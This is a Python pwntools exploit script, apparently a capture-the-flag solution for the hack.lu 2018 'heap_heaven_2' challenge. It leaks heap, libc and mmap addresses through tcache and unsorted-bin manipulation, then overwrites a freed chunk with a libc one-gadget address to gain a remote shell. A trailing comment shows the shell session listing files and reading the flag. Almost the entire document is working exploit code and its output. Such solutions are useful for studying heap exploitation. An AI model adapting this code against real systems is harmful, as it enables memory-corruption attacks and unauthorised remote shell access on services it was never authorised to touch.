from pwn import *

#r=process("./heap_heaven_2",env={"LD_PRELOAD": "./libc.so.6"})
#pause()#
r=connect("arcade.fluxfingers.net",1809)
r.recvuntil("exit\n")
#libc=ELF("./libc.so.6")
libc=ELF("./libc.so.6")
def write(content,offset):
    r.sendline("1")
    r.recvuntil("?")
    r.sendline(str(len(content)))
    r.recvuntil("?")
    r.sendline(str(offset))
    r.send(content)
    r.recvuntil("exit\n")

def free(offset):
    r.sendline("3")
    r.recvuntil("?")
    r.sendline(str(offset))
    r.recvuntil("exit\n")

def leak(offset):
    r.sendline("4")
    r.recvuntil("?\n")
    r.sendline(str(offset))
    leakage=r.recvuntil("\n")
#    print leakage
    leakage=u64(leakage[:-1].ljust(8,"\x00"))
#    print hex(leakage)
    r.recvuntil("exit\n") 
    return leakage


#chunk 1
write(p64(0)+p64(0x91),0x0)
write("AAAAAAAA",0x10)
#chunk 2
write(p64(0)+p64(0x91),0x90)
write("BBBBBBBB",0xa0)

#chunk 3
write(p64(0)+p64(0x91),0x120)
write("CCCCCCCC",0x130)

#chunk 4
write(p64(0)+p64(0x91),0x1b0)
write("DDDDDDDD",0x1c0)

#chunk 5
write(p64(0)+p64(0x91),0x240)
write("EEEEEEEE",0x250)

#chunk 6
write(p64(0)+p64(0x91),0x2d0)
write("FFFFFFFF",0x2e0)

#chunk 7
write(p64(0)+p64(0x91),0x360)
write("GGGGGGGG",0x370)

#chunk 8
write(p64(0)+p64(0x91),0x3f0)
write("HHHHHHHH",0x400)

#chunk 9
write(p64(0)+p64(0x91),0x480)
write("IIIIIIII",0x490)

write(p64(0)+p64(0x20ff1),0x510)

#finish 0x90 tcache
for i in range(7):
    free(0x10+(i*0x90))

free(304)
#real heap
heap_leak=leak(304)
#libc
#fix the null byte
write("\x41",304)
libc_leak=leak(448)-0x41
write("\x00",304)
#mmap
mmap_leak=leak(592)

#log.info("heap leak : "+hex(heap_leak))
#log.info("libc leak : "+hex(libc_leak))
#log.info("mmap leak : "+hex(mmap_leak))

heap_base = heap_leak - 0x290
libc_base = libc_leak - 1829632
mmap_base = mmap_leak - 0x130

log.info("heap base : "+hex(heap_base))
log.info("libc base : "+hex(libc_base))
log.info("mmap base : "+hex(mmap_base))

#make it point to menu
#and leak it out
code_base_container = heap_base +648
#print hex(code_base_container)
write(p64(code_base_container),304-0x90)
write(p64(mmap_base+0xa0),304)
code_base =leak(160)-0x1683
mmap_size = code_base+0x00000004010
log.info("code base : "+hex(code_base))
log.info("mmap_size : "+hex(mmap_size))
log.info("vtable : "+str(heap_base+0x260-mmap_base))

write(p64(0)+p64(0x21),0x510)
write(p64(0)+p64(0x20ff1),0x530)

free(0x520)
write(p64(libc_base+0xe75f0)*2,0x520)
r.sendline("3")
r.sendline(str(heap_base+0x260-mmap_base))
sleep(1)
r.sendline("ls -al")
r.interactive()


#At which offset do you want to free?
#\x89��Fc: cannot set terminal process group (5855): Inappropriate ioctl for device
#\x89��Fc: no job control in this shell
#[chall@hacklu18 ~]$ total 32
#drwxr-s--- 2 root chall  4096 Oct 13 22:50 .
#drwxr-xr-x 3 root root   4096 Oct  9 16:16 ..
#-r--r----- 1 root chall    43 Oct 13 22:52 flag
#-rwxr-sr-x 1 root chall 17304 Oct 13 22:50 heap_heaven_2
#[chall@hacklu18 ~]$ $ cat flag
#flag{th1s_w4s_still_ez_h3ap_stuff_r1ght?!}
#[chall@hacklu18 ~]$ exit
#[*] Got EOF while reading in interactive
